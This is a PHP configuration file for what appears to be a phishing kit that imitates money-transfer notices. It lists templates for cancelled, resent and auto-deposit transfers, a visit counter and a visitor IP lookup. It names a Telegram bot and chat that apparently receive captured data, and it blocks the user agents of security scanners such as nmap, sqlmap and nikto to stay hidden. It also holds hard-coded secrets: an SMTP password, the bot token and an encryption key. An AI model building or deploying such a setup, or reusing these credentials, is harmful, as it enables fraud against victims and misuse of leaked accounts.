<?php

return [
    // File paths
    'accounts_file'        => __DIR__ . '/../data/accounts.json',
    'pending_file'         => __DIR__ . '/../data/pending.csv',
    'contacts_file'        => __DIR__ . '/../data/contacts.csv',
    'transactions_file'    => __DIR__ . '/../data/transactions.csv',
    'email_template'       => __DIR__ . '/../templates/default_template.html',

    // Templates
    'templates' => [
        'cancel'        => __DIR__ . '/../templates/cancel_template.html',
        'resend'        => __DIR__ . '/../templates/resend_template.html',
        'auto_deposit'  => __DIR__ . '/../templates/auto_deposit_template.html',
    ],

    // Log file locations
    'logs' => [
        'transaction_log' => __DIR__ . '/../logs/transaction.log',
        'error_log'       => __DIR__ . '/../logs/error.log',
        'access_log'      => __DIR__ . '/../logs/access.log',
        'log_directory'   => __DIR__ . '/results',
        'log_file'        => __DIR__ . '/results/log.txt',
        'visit_count_file'=> __DIR__ . '/results/visit_count.txt',
    ],

    // General settings
    'csrf_token_length'    => 32,
    'transfer_expiry_days' => 30,
    'sendername'           => 'PROJECT LANDSCAPE LTD',

    // SMTP configurations
    'smtp' => [
        'host'         => 'smtp.office365.com',
        'username'     => 'accounting@project-landscape.ca',
        'password'     => 'Notbadyou12!!',
        'from_email'   => 'accounting@project-landscape.ca',
        'sendername'   => 'PROJECT LANDSCAPE LTD',
        'encryption'   => 'tls',
        'port'         => 587,
    ],

    // Telegram configurations
    'telegram' => [
        'bot_token' => '5884162033:AAEQmqSk2lsirAukPYg5kxyeA8PDrHsli9Q', // Replace as needed
        'chat_id'   => '-1002315029899',                                // Replace as needed
    ],

    // Admin configurations
    'ADMIN' => [
        'apiToken' => '5884162033:AAEQmqSk2lsirAukPYg5kxyeA8PDrHsli9Q',
        'chatId'   => '-1002315029899',
    ],

    // Security configurations
    'security' => [
        'account_password_hash' => password_hash('your_secure_password', PASSWORD_BCRYPT),
        'security_answer'       => 'Secret123', // Replace with your predefined security answer
    ],

    // Encryption settings
    'encryption' => [
        'key'    => '8d969eef6ecad3c29a3a629280e686cf',
        'cipher' => 'aes-256-cbc',
    ],

    // WTFIsMyIP API URL
    'wtfismyip_url' => 'https://wtfismyip.com/json',

    // Security Headers
    'security_headers' => [
        'X-Content-Type-Options' => 'nosniff',
        'X-Frame-Options'         => 'DENY',
        'X-XSS-Protection'        => '1; mode=block',
        'Strict-Transport-Security' => 'max-age=63072000; includeSubDomains; preload',
        'Referrer-Policy'         => 'no-referrer',
        'Permissions-Policy'      => 'geolocation=(), microphone=(), camera=(), fullscreen=(), payment=()',
        'Cache-Control'           => 'no-store, no-cache, must-revalidate, max-age=0',
        'Pragma'                  => 'no-cache',
        'Expect-CT'               => 'enforce, max-age=86400',
    ],

    // Blocked User Agents
    'blocked_user_agents' => [
        'nmap',
        'sqlmap',
        'nikto',
        'wpscan',
        'acunetix',
        'whatweb',
        'masscan',
    ],
];
